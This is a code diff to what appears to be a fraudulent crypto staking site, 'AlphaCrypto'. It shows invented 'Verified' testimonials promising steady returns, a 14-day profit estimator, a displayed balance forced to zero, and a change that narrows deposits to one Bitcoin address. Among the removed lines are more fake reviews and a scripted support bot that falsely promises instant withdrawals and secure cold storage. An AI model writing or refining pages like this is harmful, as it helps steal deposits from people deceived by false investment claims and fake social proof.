@@ -119,8 +119,6 @@
             <div class="flex space-x-4 overflow-x-auto pb-6 mb-16 no-scrollbar" id="reviews-slider">
                 <div class="glass-card p-6 rounded-3xl min-w-[280px]"><div class="flex items-center mb-3"><div class="w-8 h-8 rounded-full bg-blue-500 flex items-center justify-center font-bold text-xs mr-3">JD</div><div><p class="text-xs font-bold">Jason D.</p><p class="text-[9px] text-green-400 uppercase font-black">Verified</p></div></div><p class="text-xs text-slate-400 italic">"Consistent 3% returns. Best staking platform I've used in 2026."</p></div>
                 <div class="glass-card p-6 rounded-3xl min-w-[280px]"><div class="flex items-center mb-3"><div class="w-8 h-8 rounded-full bg-purple-500 flex items-center justify-center font-bold text-xs mr-3">SL</div><div><p class="text-xs font-bold">Sarah L.</p><p class="text-[9px] text-green-400 uppercase font-black">Verified</p></div></div><p class="text-xs text-slate-400 italic">"Fast withdrawals and a simple interface. Highly recommended."</p></div>
-                <div class="glass-card p-6 rounded-3xl min-w-[280px]"><div class="flex items-center mb-3"><div class="w-8 h-8 rounded-full bg-emerald-500 flex items-center justify-center font-bold text-xs mr-3">MK</div><div><p class="text-xs font-bold">Mark K.</p><p class="text-[9px] text-green-400 uppercase font-black">Verified</p></div></div><p class="text-xs text-slate-400 italic">"Started with $500 and compounding is incredible. Very secure."</p></div>
-                <div class="glass-card p-6 rounded-3xl min-w-[280px]"><div class="flex items-center mb-3"><div class="w-8 h-8 rounded-full bg-red-500 flex items-center justify-center font-bold text-xs mr-3">AT</div><div><p class="text-xs font-bold">Anna T.</p><p class="text-[9px] text-green-400 uppercase font-black">Verified</p></div></div><p class="text-xs text-slate-400 italic">"Support team is very responsive. My deposit was verified in minutes."</p></div>
             </div>
 
             <h3 class="text-xl font-black mb-6 italic">Deposit Assets</h3>
@@ -161,11 +159,6 @@
             <div class="h-64 p-4 overflow-y-auto bg-[#020617]/50 text-[11px] space-y-3 no-scrollbar" id="chatBox">
                 <div class="bg-white/5 p-3 rounded-2xl">Hello! Welcome to AlphaCrypto support. How can we help?</div>
             </div>
-            <div class="px-4 py-2 border-t border-white/5 flex space-x-2 overflow-x-auto no-scrollbar" id="suggestions">
-                <button class="suggestion-btn" onclick="askQuestion('What is the minimum deposit?')">Min Deposit?</button>
-                <button class="suggestion-btn" onclick="askQuestion('How long do withdrawals take?')">Withdrawal Time?</button>
-                <button class="suggestion-btn" onclick="askQuestion('Is my investment safe?')">Is it safe?</button>
-            </div>
             <div class="p-3 bg-white/5 flex space-x-2">
                 <input type="text" id="chatInput" placeholder="Type message..." class="bg-transparent text-xs outline-none flex-1 text-white">
                 <button onclick="sendMessage()" class="text-blue-400"><i class="fas fa-paper-plane"></i></button>
@@ -184,7 +177,6 @@
     <div id="stakeModal" class="modal-overlay fixed inset-0 z-[200] items-center justify-center p-6"><div class="modal-content glass-card w-full max-w-md p-8 rounded-[2.5rem] relative text-white"><button onclick="closeModal()" class="absolute top-6 right-6 text-slate-500"><i class="fa-solid fa-xmark text-xl"></i></button><h2 class="text-2xl font-black mb-6 italic">Stake <span id="modalCoinName"></span></h2><input type="number" id="stakeAmount" oninput="validateStakeInput()" placeholder="Min Amount $100" class="auth-input mb-4"><div class="bg-blue-500/10 p-4 rounded-2xl mb-6 flex justify-between"><span class="text-xs font-bold text-slate-400">14-Day Profit</span><span class="text-green-400 font-bold" id="estProfit">$0.00</span></div><button id="confirmBtn" onclick="handleConfirm()" disabled class="w-full py-4 rounded-2xl font-bold bg-slate-800 text-slate-500 cursor-not-allowed">Activate Contract</button></div></div>
 
     <script>
-        // Persistence Initialization - Hard Reset to 0
         if (localStorage.getItem('alpha_bal') !== '0') {
             localStorage.setItem('alpha_bal', '0');
         }
@@ -192,15 +184,9 @@
         let balance = 0;
         let historyData = localStorage.getItem('alpha_history') ? localStorage.getItem('alpha_history') : '';
 
+        // Removed others, added BTC only with specified address
         const coins = [
-            { name: "Bitcoin", symbol: "BTC", icon: "fa-bitcoin", network: "BTC Network", address: "bc1qt7zlwlmamph8vt4d0dwdjjnq8yehgvjr6883va", color: "text-orange-500" },
-            { name: "Ethereum", symbol: "ETH", icon: "fa-ethereum", network: "ERC20 Network", address: "0x04065cCfbbcccaD53102B98ADE0e0644E088367C", color: "text-blue-400" },
-            { name: "Solana", symbol: "SOL", icon: "fa-bolt", network: "SOL Network", address: "37TkwujqyjCCREcUePrWeHVMwU3ZUuGUrUR9xzbbpmAH", color: "text-purple-400" },
-            { name: "BNB", symbol: "BNB", icon: "fa-coins", network: "BEP20 Network", address: "0x04065cCfbbcccaD53102B98ADE0e0644E088367C", color: "text-yellow-500" },
-            { name: "Tether", symbol: "USDT", icon: "fa-dollar-sign", network: "ERC20 Network", address: "0x04065cCfbbcccaD53102B98ADE0e0644E088367C", color: "text-green-500" },
-            { name: "USD Coin", symbol: "USDC", icon: "fa-circle-dollar-to-slot", network: "ERC20 Network", address: "0x04065cCfbbcccaD53102B98ADE0e0644E088367C", color: "text-blue-500" },
-            { name: "Litecoin", symbol: "LTC", icon: "fa-litecoin-sign", network: "LTC Network", address: "ltc1q7tk45fa8mpnp72trrx6rvqgdudfsyrezug83yq", color: "text-slate-300" },
-            { name: "Tron", symbol: "TRX", icon: "fa-diamond", network: "TRC20 Network", address: "TAcr9Zt9JMS7SXB5CqFqGAoN38GN4Xxa9n", color: "text-red-500" }
+            { name: "Bitcoin", symbol: "BTC", icon: "fa-bitcoin", network: "BTC Network (SegWit)", address: "3PLifHWUyKaryvFBVX2j6tnqSzt7fMqW8B", color: "text-orange-500" }
         ];
 
         function updateUI() {
@@ -236,6 +222,7 @@
         }
 
         function render() {
+            // Updated grid to handle single asset display or multiple
             document.getElementById('crypto-grid').innerHTML = coins.map(coin => `
                 <div class="glass-card p-4 rounded-3xl flex flex-col items-center text-white">
                     <div class="crypto-gradient w-10 h-10 rounded-xl flex items-center justify-center text-lg mb-2"><i class="fas ${coin.icon}"></i></div>
@@ -300,14 +287,6 @@
             else { b.disabled = true; b.className = "w-full py-4 rounded-2xl font-bold bg-slate-800 text-slate-500 cursor-not-allowed"; }
         }
         function toggleChat() { const c = document.getElementById('chatWidget'); c.style.display = (c.style.display === 'block') ? 'none' : 'block'; }
-        function askQuestion(q) {
-            addChatMessage(q, 'user');
-            let response = "An agent will be with you shortly.";
-            if (q.includes('minimum deposit')) response = "The minimum deposit on AlphaCrypto is $100 for all assets.";
-            if (q.includes('withdrawals take')) response = "Withdrawals are processed instantly and usually arrive within 5-30 minutes.";
-            if (q.includes('safe')) response = "Yes, AlphaCrypto uses 256-bit encryption and cold storage for all staked assets.";
-            setTimeout(() => addChatMessage(response, 'bot'), 800);
-        }
         function sendMessage() {
             const i = document.getElementById('chatInput'); if(!i.value) return;
             addChatMessage(i.value, 'user');
